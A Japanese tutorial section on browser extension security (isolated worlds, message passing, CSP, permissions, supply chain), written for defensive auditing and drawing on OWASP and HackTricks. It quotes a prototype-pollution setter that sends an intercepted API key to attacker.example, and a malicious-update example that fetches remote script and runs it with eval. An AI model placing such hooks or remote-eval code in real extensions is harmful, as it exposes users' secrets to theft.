## ブラウザ拡張のセキュリティ（content script/isolated world）

Web アプリの脆弱性ハンティングに慣れた人がブラウザ拡張を見ると、最初はただの「JavaScript の詰め合わせ」に見える。しかし拡張は、**Same-Origin Policy（同一オリジンポリシー）の外側に立つ特権コード**であり、ひとつのバグが「特定サイトの XSS」ではなく「全オリジンの読み取り」「Cookie の全取得」「OS コマンド実行」に化ける。本節では、拡張のアーキテクチャと isolated world（分離ワールド）の内部機構を仕組みレベルで押さえ、そこから導かれる脆弱性クラスと防御を体系化する。

前提として本節は**防御・自己資産の監査を目的**とする。解析対象は自分が開発・配布する拡張、あるいは明示的な許可を得た拡張に限る。実在サービスや他人の環境に対する無許可の検証は行わない。

### 拡張のアーキテクチャ：3 つの実行コンテキストと特権の落差

HackTricks の方法論は、拡張を 3 つの構成要素に分けて捉える。

1. **Content Script（コンテンツスクリプト）** — 対象ページに注入され、そのページの DOM に直接アクセスできる。ただし拡張 API はごく一部（`chrome.runtime` の一部、`chrome.storage` など）しか使えない。**低特権・高露出**の層。
2. **Extension Core（拡張コア）** — MV3 では Service Worker（背景スクリプト）、およびポップアップ／オプションページ等の拡張ページ。`chrome-extension://<id>/` オリジンで動き、マニフェストで宣言した権限（タブ、Cookie、ネットワーク、ホスト権限）をフルに持つ。**高特権・低露出**の層。
3. **Native Binary（ネイティブバイナリ）** — native messaging 経由で拡張コアと stdin/stdout で会話する OS 上の実行ファイル。**最高特権**（ブラウザのサンドボックスの外）。

この 3 層はそれぞれ別のプロセス／別のサンドボックスに置かれる。セキュリティ上の本質は、**特権が右へ行くほど上がるのに、攻撃者が触れるのは左端だけ**という構造だ。したがって拡張の脆弱性ハンティングとは、ほぼ常に「左から右へのメッセージ経路のどこかで検証が抜けていないか」を探す作業になる。

#### manifest.json：攻撃面の設計図

監査は必ず `manifest.json` から始める。HackTricks が示す骨格は次の通り（MV2 の例だが、フィールドの意味は MV3 でも共通）。

```json
{
  "manifest_version": 2,
  "name": "Extension Name",
  "version": "1.0",
  "permissions": ["storage"],
  "host_permissions": ["https://example.com/*"],
  "content_scripts": [
    {
      "js": ["script.js"],
      "matches": ["https://example.com/*"],
      "run_at": "document_idle"
    }
  ],
  "background": {"scripts": ["background.js"]},
  "web_accessible_resources": [
    {"resources": ["images/*.png"], "matches": ["https://example.com/*"]}
  ],
  "externally_connectable": {
    "matches": ["https://app.example.com/*"]
  }
}
```

読み方のコツは、**各フィールドを「攻撃者が到達できる入口」として数える**ことだ。

- `content_scripts.matches` — どのオリジンのページが、この拡張のコードと同居できるか。`<all_urls>` や `*://*/*` なら、攻撃者が用意した任意のページ上で content script が動く。つまり攻撃者は content script の入力を自由に制御できる。
- `run_at` — `document_start`（DOM 構築前）／`document_end`（DOMContentLoaded 相当）／`document_idle`（既定、ロード完了後の空き時間）。後述するレース条件に効く。
- `externally_connectable.matches` — Web ページから直接 Service Worker へメッセージを投げられるオリジン。ここに載ったオリジンの XSS は、**content script という緩衝材を飛び越えて**高特権層に到達する。
- `web_accessible_resources` — 外部ページから `chrome-extension://<id>/...` で参照できるファイル。拡張の存在検知（フィンガープリンティング）とクリックジャッキングの入口。
- `permissions` / `host_permissions` — MV3 では API 権限（`storage`, `tabs`, `cookies` …）と、アクセス可能なオリジン（`https://*/*` 等）が別フィールドに分離された。被害の上限を決めるのはほぼこの 2 つ。

> 出典: Browser Extension Pentesting Methodology — https://hacktricks.wiki/en/pentesting-web/browser-extension-pentesting-methodology/index.html
> （注: 上記 URL は取得時に有料ゲートウェイへ 302 リダイレクトされ 402 を返したため、同一内容の原本である HackTricks 公式リポジトリの raw Markdown から取得した。）

### isolated world の内部機構 —「分離されている」とは何が分離されているのか

ここが本節の核心である。content script は「ページと同じ DOM を見るが、同じ JavaScript 世界にはいない」。この直感を実装レベルに落とす。

#### 仕組み：ワールドごとの V8 コンテキストと DOM ラッパー

Chromium では、1 つのフレーム（document）に対して複数の **world** が存在できる。main world（ページ自身のスクリプト）と、拡張ごとに 1 つ割り当てられる isolated world である。各 world は**独立した V8 Context**を持つ。V8 Context とは、グローバルオブジェクト（`window`）とすべての組み込みオブジェクト（`Object`, `Array`, `Function`, `Element.prototype` など、いわゆる primordials）の 1 セットを指す。

一方、DOM ツリーそのものは Blink（C++）側のオブジェクトであり、フレームにつき 1 つしかない。JavaScript から DOM を触るときに使う `HTMLDivElement` インスタンスは、この C++ オブジェクトに対する **world ごとの JS ラッパー**だ。したがって：

- **共有されるもの**: DOM ノードの構造・属性値・テキスト、フォームの入力値、`location`、Cookie（`document.cookie`）、発火するイベント。これらは Blink 側の状態なので、どの world から見ても同じ。
- **分離されるもの**: `window` のプロパティ、`Object.prototype` などの組み込みオブジェクトとその改変、DOM ノードに付けた expando（独自プロパティ。例: `el.myData = x`）、関数の再定義。main world で `Element.prototype.innerHTML` の setter を差し替えても、isolated world のラッパーは別の `Element.prototype` を参照しているため**影響を受けない**。

この設計から重要な帰結が 2 つ出る。

**帰結 1: JS レベルの汚染からは守られる。** ページが `Object.defineProperty(Object.prototype, 'apiKey', {...})` のようなプロトタイプ汚染を仕掛けても、isolated world で動く content script のオブジェクトはその setter を踏まない。逆に言えば、**この保護は content script を出た瞬間に消える**（次項の main world 注入）。

**帰結 2: DOM レベルの攻撃からは守られない。** content script が読む DOM の中身は、すべてページ（＝攻撃者）が自由に書ける。具体的には次が効く。

- **DOM clobbering** — `<img name="config">` や `<form id="token">` を置くと、名前付きアクセス（named access）によって `window.config` / `document.token` が DOM 要素を返す。これは Blink の DOM 仕様に基づく挙動であり、**isolated world の `window` でも同じように起きる**。content script が `window.config?.endpoint ?? DEFAULT` のような書き方をしていると、ページ側に値を握られる。
- **偽イベント** — ページは `dispatchEvent(new MouseEvent('click'))` で content script のリスナを呼べる。ユーザ操作と区別するには `event.isTrusted === true` を確認するしかない。
- **属性・テキストの sink 化** — content script が `el.dataset.url` を `chrome.runtime.sendMessage` にそのまま流せば、ページが背景スクリプトのリクエスト先を決められる。

> 補足（sink の定義）: **sink（シンク）** とは、入力が最終的に実行・解釈される危険な代入先を指す。拡張では `innerHTML`, `eval`, `Function()`, `location` 代入に加え、**`chrome.*` API の引数**（特に `scripting.executeScript` のコード、`sendNativeMessage` のペイロード、`fetch` の URL）が最重要の sink になる。

#### 時間軸の罠：document_start でも「最初」ではない

「`document_start` で動けば、ページのスクリプトより先に実行できるから安全」という前提は成立しない。OWASP が明記する通り、Chromium では**新しく生成された iframe のコンテキストを、親ページのスクリプトが拡張スクリプト実行前に細工できる**既知の問題がある（Chromium issue 40202434）。したがって「先に走っているから native な prototype が使えるはず」という設計は避ける。

#### Firefox の違い：Xray vision

Firefox（WebExtensions）では、content script からページのオブジェクトを見るときに **Xray vision** という追加の仕組みが働く。ページ側が `window.JSON.parse` を差し替えていても、content script からは元の native な実装が見える。ページ側の改変込みのオブジェクトに触りたい場合は明示的に `window.wrappedJSObject` を使う必要があり、逆方向にデータを渡すには `cloneInto()` / `exportFunction()` を使う。Chromium にはこの層はなく、world 分離のみで同等の効果を得ている。**クロスブラウザ拡張を監査するときは、Firefox でだけ安全に見えるコードが Chromium では危険になり得る**点に注意する。

### main world への注入と prototype-based data skimming

拡張がページの JS 変数にアクセスしたい、あるいはページ内のフレームワークと連携したい場合、`<script>` タグを DOM に挿入する（src は `web_accessible_resources` に登録した拡張内ファイル）か、Chrome 111 以降であればマニフェストの `content_scripts` に `"world": "MAIN"` を指定する／`chrome.scripting.executeScript({ world: "MAIN" })` を使う。この瞬間、そのコードは**ページと同じ V8 Context に落ちる**。isolated world の保護はゼロになる。

OWASP はこれを「Prototype-based Data Skimming（プロトタイプ経由のデータ抜き取り）」として独立した脆弱性クラスに挙げ、次の実例を示す。

```javascript
// 悪意あるページ側: 全オブジェクトの 'apiKey' setter を乗っ取り、
// 代入された値をそのまま攻撃者サーバへ送る
Object.defineProperty(Object.prototype, 'apiKey', {
    set: function (str) {
        fetch(`https://attacker.example?data=${str}`);
        Object.defineProperty(this, 'apiKey', {
            value: str
        })
        return str
    }
})

// 拡張が main world で実行するスクリプト
window.addEventListener('message', (data) => {
  if (data.apiKey) {
    // 'apiKey' の setter は既に汚染済み。
    // この 1 行で悪意あるコードが起動し、値は即座に外部送信される。
    window.apiController.apiKey = data.apiKey;
  }
})
```

なぜ成立するのか。`window.apiController.apiKey = ...` は、まず `apiController` の自身のプロパティを探し、無ければプロトタイプチェーンを辿って setter を探す。`Object.prototype` に setter が定義されていればそれが呼ばれる——これは JavaScript のプロパティ代入セマンティクスそのものであり、バグではない。main world にいる限り、**代入・関数呼び出し・メソッド参照のほぼすべてが攻撃者のフックを通り得る**。

対策として OWASP は次を明示する。

- 機微情報は、たとえ一瞬でもページのコンテキストで扱わない。
- どうしても main world のスクリプトと通信するなら、**非機微な最小限の情報だけ**を渡す（例: トークン本体ではなく「検証結果の真偽値」だけ）。`window.postMessage` も同様で、`postMessage` 自体を差し替えられるし、攻撃者は `message` リスナを追加できる。
- **「汚染されていない native prototype を取り戻す小技」に依存しない。** そうした手法は知られているが、それを迂回する手法（他スクリプトに汚染済み prototype を強制的に使わせる方法）も次々に考案されている。

つまり正しい設計は「main world でも安全に書く」ではなく、**「機微データを main world に持ち込まない」**である。

### DOM-based Data Skimming：画面に出した時点で漏れている

main world にコードを置かなくても、**ページの DOM に機微情報を描画した時点で**ページのスクリプトから読まれる。OWASP の例：

```javascript
// content-script.js
// 拡張の背景サービスから取得した機微データ
const userData = {
  name: "Jane Doe",
  email: "jane.doe@example.com"
};

// ページの DOM に直接挿入している（= ページのスクリプトから読める）
const userInfoDiv = document.createElement('div');
userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
document.body.appendChild(userInfoDiv);
```

content script が isolated world にいても、**挿入した要素は共有 DOM の一部**なので `document.querySelector` で普通に読める。React 等のフレームワークでコンポーネントを注入しても同じである。対象は PII、決済情報、AI チャット履歴など。

対策は、拡張が完全に制御する UI 面に出すこと：**ポップアップ**、**オプションページ**、**サイドパネル**（Chromium 用語。Firefox では「サイドバー」）。

注意点として OWASP は、**Shadow DOM は緩和策として不十分**と明言する。`open` な Shadow Root はページから `element.shadowRoot` で辿れる。`closed` であっても、脅威モデルに「他の拡張」を含めるなら安全ではない——拡張は `openOrClosedShadowRoot()` API で closed Shadow DOM を貫通できるからだ。

### メッセージパッシング：信頼境界が壊れる場所

#### ページ → content script（window.postMessage）

HackTricks の推奨する受信側テンプレート：

```javascript
// content script 側のリスナ
window.addEventListener("message", (event) => {
  if (event.source !== window) return // 同一ウィンドウ由来か確認
  if (event.data.type === "FROM_PAGE") {
    chrome.runtime.sendMessage(event.data) // 背景へ転送
  }
}, false)
```

この形は**そのままでは危険**である点を理解しておきたい。`event.source !== window` のチェックは「別フレームからの postMessage」を弾くだけで、**同じページ上の任意のスクリプト（＝攻撃者）は通過する**。content script が `<all_urls>` にマッチしているなら、攻撃者は自分のサイトで同じ postMessage を投げるだけでこの経路に乗れる。HackTricks が併せて挙げる `event.isTrusted`、オリジン（`event.origin`）、`event.source` の検証は最低限であり、根本的には**「ページからのメッセージは常に敵対的入力」として扱い、転送先で厳格に検証する**しかない。

#### content script → Service Worker（chrome.runtime.sendMessage）

```javascript
// content script から送信
const response = await chrome.runtime.sendMessage({greeting: "hello"})

// 背景側で受信・応答
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.greeting === "hello") {
    sendResponse({farewell: "goodbye"})
  }
  return true // sendResponse を非同期で呼ぶ場合に必要
})
```

`return true` はリスナが同期的に終了してもメッセージチャネルを開いたままにする宣言で、これを忘れると非同期応答が届かない（実装上のよくある罠）。双方向・継続的な通信には `chrome.runtime.connect()` によるポートを使う。

OWASP が「Insecure Message Passing」として挙げる典型的な脆弱コードは次の通り。

```javascript
// Service Worker（背景）内
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'fetchSecret') { // 送信元を一切検証していない
    // 悪意あるコンテンツスクリプト／Web ページがこれを起動できてしまう
    fetch(SECRET_API_URL);
  }
});
```

推奨される形：

```javascript
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (sender.id !== chrome.runtime.id) return;
  if (!sender.url?.startsWith('chrome-extension://')) return;

  if (request.action === 'fetchSecret') {
    fetch(SECRET_API_URL);
  }
});
```

ここは**なぜ 2 つの条件が必要か**が肝である。`sender.id !== chrome.runtime.id` は「他の拡張からのメッセージ」を弾くだけで、**自分の content script は必ずこのチェックを通る**。そして content script は攻撃者のページ上で動いているかもしれない。だから 2 行目で `sender.url` が `chrome-extension://` で始まること、すなわち**送信元が拡張ページ（ポップアップ／オプションページ）であること**を要求している。Chrome 自身が「content script は拡張ページより信頼できない」と明言しており、この区別が設計の中心になる。

実務上のチェック項目（OWASP の Mitigation を実装に落としたもの）：

- `sender.id` を検証して自拡張由来であることを確認する。
- `sender.url` / `sender.origin` を検証し、どの拡張ページ・どのオリジンの content script が話しかけられるかを絞る（content script を許す場合は**オリジンの許可リスト**にする。`sender.tab` の有無で content script か拡張ページかを判別できる）。
- Web ページが content script を介して間接的に特権ロジックを動かせる作りを避ける。
- `request.action` と**すべてのパラメータ**を許可リスト方式で厳密に検証する（URL を受け取るなら文字列一致か、スキーム＋ホストの完全一致で判定する）。

#### 最も影響の大きいプリミティブ：CORS / SOP バイパス読み取り

なぜメッセージハンドラの検証漏れが「中程度」ではなく「重大」なのか。背景スクリプトの `fetch` は**拡張のホスト権限に基づいて実行され、ページの Same-Origin Policy と CORS の制約を受けず、ユーザの Cookie が付く**。したがって `{action:'proxyFetch', url: <任意>}` のようなハンドラが検証なしに存在し、かつ `host_permissions` が `<all_urls>` なら、攻撃者のページは

1. content script（または `externally_connectable`）経由で任意 URL の取得を依頼し、
2. ログイン済みの任意サイトのレスポンス本文を受け取る

ことができる。これは実質的に**全オリジンに対する universal な読み取り**であり、拡張の脆弱性報告で最高評価が付く典型だ。監査では「背景側に汎用 fetch/XHR プロキシがないか」を最優先で探す。

#### externally_connectable：緩衝材を飛ばす近道

`externally_connectable` は、Web ページや他拡張が `chrome.runtime.sendMessage(extensionId, ...)` で直接メッセージを送れる相手を指定する。HackTricks の対比：

```javascript
// 危険: サブドメインをまとめて許可
"matches": ["https://*.example.com/*"]

// 安全: 単一オリジンを明示
"matches": ["https://app.example.com/*"]
```

ワイルドカードが危険な理由は明快で、`*.example.com` のどれか 1 つ——放置されたステージング環境、ユーザ生成コンテンツを置くサブドメイン、買収した古いサービス——に XSS が 1 つあれば、そこから**直接** Service Worker にメッセージを送れる。HackTricks はこれを「XSS が content script の CSP を完全に迂回して背景スクリプトへ到達する」と表現している。サブドメインテイクオーバーとの合わせ技も現実的な脅威だ。

なお、このキーを**宣言しない**場合の既定挙動は「どの Web ページも接続できないが、他の拡張は `onMessageExternal` に到達できる」である（Chrome）。他拡張からのメッセージも拒否したいなら `"externally_connectable": {"ids": []}` のように明示的に閉じる。

> 出典: OWASP Browser Extension Vulnerabilities Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html

### web_accessible_resources：外から見える拡張の窓

`web_accessible_resources`（WAR）に載せたファイルは、外部ページから `chrome-extension://<id>/page.html` のような URL で読み込める。MV3 では対象を絞れる形式になっている。

```json
"web_accessible_resources": [
  {
    "resources": ["injected.js", "ui/panel.html"],
    "matches": ["https://app.example.com/*"],
    "use_dynamic_url": true
  }
]
```

- `matches` — このリソースを参照できるオリジンを限定する（MV2 には無く、全オリジンに公開だった）。
- `extension_ids` — 特定拡張だけに公開する場合に使う。
- `use_dynamic_url`（Chrome 104 頃〜） — URL 中の拡張 ID をセッションごとのランダム値に置き換え、後述のフィンガープリンティングを緩和する。

WAR が生むリスクは 3 つある。

1. **拡張のフィンガープリンティング／存在検知** — 任意サイトが `fetch('chrome-extension://<known-id>/icon.png')` の成否で拡張の有無を判定できる。ID はストア公開拡張では固定値なので総当たり可能。Firefox は `moz-extension://<インストールごとのランダム UUID>` を使うため列挙されにくいが、逆に UUID が漏れると強い追跡子になる。
2. **クリックジャッキング** — WAR に含めた HTML ページ（設定画面、承認ダイアログ等）は外部サイトから iframe に埋め込める。拡張ページの CSP に `frame-ancestors 'none'` を入れて塞ぐ。
3. **拡張ページ上の DOM XSS** — WAR ページが `location.hash` や `postMessage` をそのまま `innerHTML` に流すと、`chrome-extension://` オリジンで XSS が成立する。これは**拡張の全権限を伴う XSS**であり、通常の Web XSS とは比較にならない重大度になる。

また、main world 注入のために `injected.js` を WAR に置くパターンは一般的だが、このスクリプト自体が「ページから読める・解析できるコード」である点を忘れないこと。秘密鍵やエンドポイントの隠蔽には一切ならない。

### 拡張の CSP と MV3 の「遠隔コード禁止」

拡張ページの既定 CSP は厳しく、HackTricks が示す通り `script-src 'self'; object-src 'self';` が基本線である。MV3 ではさらに、`extension_pages` に対して**この既定を緩める方向の変更が許されない**（`unsafe-eval` や外部 CDN の許可は不可。WebAssembly については `wasm-unsafe-eval` が Chrome 103 頃から個別に許可される）。

```json
{
  "manifest_version": 3,
  "content_security_policy": {
    "extension_pages": "script-src 'self'; object-src 'self'; frame-ancestors 'none'"
  }
}
```

MV2 時代は `unsafe-eval` や CDN のホワイトリストが書けたため、「拡張ページに DOM XSS → CDN 上の古い JSONP エンドポイント経由で任意コード実行」という CSP バイパスが成立した。MV3 ではこの経路が構造的に塞がれている。これが MV3 で**遠隔コードのホスティングが禁止**された理由でもある：拡張のコードはストア審査を受けたパッケージ内のものだけ、という不変条件を作ることで、審査後に挙動を差し替える攻撃（後述のサプライチェーン）を封じる狙いがある。

OWASP の「Malicious Updates」はその具体例を示す。

```javascript
chrome.runtime.onInstalled.addListener(() => {
  fetch('http://example.com/update-script.js')
    .then(response => response.text())
    .then(eval); // 危険
});
```

これは MV3 では CSP により実行できないが、`eval` を使わない変種——外部から取得した**データ**を解釈して振る舞いを変えるインタプリタ的実装——は審査をすり抜けうる。OWASP / Mozilla の指針は明確で、**遠隔スクリプトを注入・同梱しない**、更新はマーケットプレイス経由に限る、取得したコードを実行する前に完全性検証を行う、である。

一点注意すべきなのは、**content script が注入するコードとページの CSP の関係**だ。content script 自身の JS 実行はページの CSP に制限されない（ブラウザが別 world で直接実行するため）。しかし content script が `document.createElement('script')` でページ DOM に `<script src=...>` を挿入した場合、その読み込みは**ページの CSP で評価される**。拡張が「CSP の厳しいサイトでだけ動かない」現象の大半はこれが原因であり、同時に「WAR の URL をページ CSP の `script-src` に許可させよう」とする危険な回避策を誘発する。

### 権限モデルと危険 API

OWASP の第 1 項「Permissions Overreach（権限の過剰要求）」が示す悪い例：

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage"
  ]
}
```

`http://*/*` と `https://*/*` は実質 `<all_urls>` であり、全サイトの内容を読み書きできる。対策は最小権限原則（PoLP）に加えて、**`optional_permissions` と `chrome.permissions.request()` による実行時要求**を使い、ユーザ操作の文脈でのみ権限を得る設計にすること。`activeTab` 権限は「ユーザが拡張アイコンをクリックしたタブにだけ、一時的にアクセスする」ための仕組みで、`<all_urls>` の代替として最も有効な選択肢である。

被害の上限を跳ね上げる API（HackTricks の「Dangerous APIs」を実務向けに整理）：

| API / 権限 | 悪用時の帰結 |
| --- | --- |
| `innerHTML` / `eval` / `Function()` | 拡張オリジンでのコード実行（拡張ページなら全権限 XSS） |
| `chrome.tabs.executeScript`（MV2）／`chrome.scripting.executeScript`（MV3） | 任意タブへのコード注入 = Universal XSS |
| `chrome.runtime.sendNativeMessage` | OS 上のバイナリへの入力 = RCE の起点 |
| `chrome.webRequest` / `chrome.declarativeNetRequest` | 通信の改竄・傍受、セキュリティヘッダの剥奪 |
| `cookies` | HttpOnly Cookie を含む全 Cookie の窃取 |
| `debugger` | DevTools プロトコル経由でブラウザを完全掌握 |
| `management` | 他拡張の無効化（セキュリティ拡張の停止） |

監査では「その権限が本当に必要か」だけでなく、**「その権限を握る関数に、外部入力がどう届くか」**を追跡する。権限そのものより、権限を持つ関数への到達経路が脆弱性である。

### Native Messaging：ブラウザの外へ出る経路

```javascript
chrome.runtime.sendNativeMessage(
  "com.company.app",
  {text: "Hello"},
  (response) => console.log(response)
)
```

`nativeMessaging` 権限と、OS 側（レジストリまたは所定のパス）に置かれた native messaging host のマニフェストが必要で、通信は stdin/stdout の長さ接頭辞付き JSON で行われる。HackTricks が指摘する危険パターンは **content script →（検証なし）→ 背景 →（検証なし）→ ネイティブバイナリ**の連鎖だ。ネイティブ側がパスやコマンド文字列を受け取って実行する実装なら、悪意あるページがそのまま OS コマンド実行に到達する。監査では、ネイティブホストのマニフェストの `allowed_origins`（接続を許す拡張 ID）が絞られているか、ネイティブ側が入力を型・値域レベルで検証しているかを必ず見る。

### データ保管とその他の実装上の落とし穴

- **Insecure Storage** — `localStorage.setItem('token', 'my-secret-token')` のような平文保存は避け、`chrome.storage` API を使う。ただし `chrome.storage` も暗号化されているわけではなく、拡張のプロファイル領域に平文で残る点は理解しておく（同じ拡張内の XSS や、ローカルにアクセスできる攻撃者からは守れない）。機微データは保存前に暗号化し、API キーや資格情報をコードにハードコードしない。
- **Data Leakage / Insecure Communication** — `fetch('http://example.com/api/data')` のような平文通信をやめ、送信内容と送信先をプライバシーポリシーで開示し、収集前に同意を取る。OWASP は閲覧 URL をそのまま外部へ POST する `chrome.tabs.onUpdated` リスナの例を挙げており、「拡張がテレメトリと称して全閲覧履歴を送る」実装は実際に多い。
- **Third-Party Dependencies** — 同梱ライブラリは `npm audit` や OWASP Dependency-Check で継続的に監査し、静的解析では Retire.js で既知脆弱バージョンを検出する。拡張は自動更新までユーザ端末に古いコードが残る点で、Web アプリより脆弱ライブラリの寿命が長い。
- **Insufficient Privacy Controls** — データの収集・共有内容を明示し、オプトアウトを提供する（GDPR / CCPA 対応）。

### サプライチェーン：買収・乗っ取り・悪性アップデート

拡張の最大の現実的脅威は、コードの脆弱性ではなく**正規の更新チャネルを通じた悪性コードの配信**である。人気拡張が買収されて広告注入・履歴収集に転じる、開発者のストアアカウントがフィッシングされて悪性版が配信される、といった事例が繰り返されてきた。

HackTricks は、新旧バージョンの差分から高シグナルな変化を拾う監視を推奨する。

- 背景スクリプト／Service Worker の新規追加・変更
- content script の新規追加（特に `matches` の拡大）
- `permissions` / `host_permissions` の追加
- 新規通信先ドメイン（C2 の可能性）
- 変更ファイルのエントロピー異常（難読化・圧縮の兆候）
- 静的解析での検知（base64 デコード、Cookie 収集、難読化パターン）

自動化には Assemblyline の各サービス（Extract、Characterize、JsJAWS、FrankenStrings、URLCreator）が利用できる。企業環境では、許可リスト方式の拡張管理ポリシーと、バージョン固定＋差分レビューの運用が現実解になる。

### 監査の実務：入手・展開・チェックリスト

配布パッケージ（CRX）は公開エンドポイントから取得できる。**自分が権限を持つ拡張、または解析が許諾された拡張に対してのみ**実施すること。

```bash
extension_id=YOUR_ID
curl -L -o "$extension_id.zip" \
  "https://clients2.google.com/service/update2/crx?response=redirect&x=id%3D$extension_id%26uc"
unzip -d "$extension_id-source" "$extension_id.zip"
```

CRX は実体が ZIP（先頭に署名ヘッダが付く）なので、そのまま `unzip` で展開できることが多い。解析補助ツールとしては、マニフェスト解析・WAR 検出・危険関数のフラグ付け・CSP バイパス判定・脆弱ライブラリ検出を行う **Tarnish**、マニフェスト／ローカライズ／JS／HTML から特徴を抽出する Python 製の **Neto**、ブラウザ上でソースを閲覧できる **CRX Viewer**（robwu.nl/crxviewer/）がある。動的解析は `chrome://extensions` を開発者モードにしてパッケージ化されていない拡張として読み込み、Service Worker の DevTools を開いて `chrome.storage` とメッセージの流れを観察する。

最後に、HackTricks の監査チェックリストを本節の内容と対応づけて再掲する。

- [ ] `permissions` / `host_permissions` を最小化する（`<all_urls>` を `activeTab` や `optional_permissions` に置換できないか）
- [ ] 厳格な CSP を設定し、`unsafe-inline` や広すぎる CDN 許可を入れない
- [ ] `externally_connectable` は単一オリジンに限定し、ワイルドカードを避ける
- [ ] `web_accessible_resources` を最小化し、`matches` で公開先を絞り、`frame-ancestors` でクリックジャッキングを防ぐ
- [ ] すべての `postMessage` 受信を検証する（`isTrusted`、オリジン、`source`）— そして転送先でも再検証する
- [ ] `chrome.runtime.onMessage` で `sender.id` と `sender.url`/`origin` を検証し、`action` とパラメータを許可リスト化する
- [ ] 資格情報や鍵を、コード・メモリ・保護されていないファイルに置かない
- [ ] content script → 背景 → ネイティブバイナリの経路を必ずサニタイズする
- [ ] 機微データのクリップボードコピーを避け、必要なら短時間でクリアする
- [ ] Retire.js 等で脆弱な third-party ライブラリを検出する
- [ ] 機微データを**ページの DOM にも main world にも**置かない（ポップアップ／オプションページ／サイドパネルを使う）

### まとめ：本節の設計原則

1. **isolated world は JS の分離であって、DOM の分離ではない。** プロトタイプ汚染からは守られるが、DOM clobbering・偽イベント・属性値の汚染からは守られない。
2. **main world に降りた瞬間、保護はゼロになる。** 機微データを main world に持ち込まない設計だけが確実な対策であり、「native prototype を取り戻す小技」に依存してはいけない。
3. **信頼境界は「ページ < content script < 拡張ページ < ネイティブホスト」。** 境界を越えるメッセージごとに、送信元の同一性（`sender.id`）と種別（`sender.url`）を検証し、ペイロードを許可リストで縛る。
4. **被害の上限を決めるのはマニフェストである。** 権限、`externally_connectable`、`web_accessible_resources` の 3 つが、同じコードバグを「軽微」にも「全オリジン読み取り」にも変える。
5. **バージョン依存を意識する。** ここで述べた MV3 の制約（遠隔コード禁止、`extension_pages` の CSP 緩和不可、`world: "MAIN"` の manifest 指定は Chrome 111 頃〜、`use_dynamic_url` は Chrome 104 頃〜）は 2026 年 9 月時点の Chromium 系の挙動であり、MV2 は Chrome では 2024〜2025 年にかけて段階的に無効化された。Firefox は MV3 を採用しつつも background page や Xray vision など挙動が異なるため、対象ブラウザとバージョンを明記して評価すること。

> 出典: Browser Extension Pentesting Methodology — https://hacktricks.wiki/en/pentesting-web/browser-extension-pentesting-methodology/index.html
> 出典: OWASP Browser Extension Vulnerabilities Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Browser_Extension_Vulnerabilities_Cheat_Sheet.html
